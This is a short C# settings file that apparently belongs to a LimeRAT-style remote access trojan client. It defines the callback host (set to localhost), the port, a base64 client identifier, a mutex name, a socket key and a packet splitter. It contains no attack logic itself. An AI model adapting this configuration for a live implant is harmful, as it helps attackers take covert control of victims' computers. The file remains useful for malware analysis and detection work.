using System.Diagnostics;
using System.Threading;

namespace Lime.Settings
{
    public static class Config
    {
        public static string host = "127.0.0.1"; // IP
        public static string port = "333"; // Port
        public static string id = "TnlhbkNhdFJldmVuZ2U="; // Client identifier [base64]
        public static string currentMutex = "pHXJvbCGPPiC"; // Mutex
        public static string key = "nyan"; // Socket Key


        public static Mutex programMutex; // Ignore
        public static string splitter = "*-]NK[-*"; // Ignore
        public static Stopwatch stopwatch = new Stopwatch(); // Ignore
    }
}
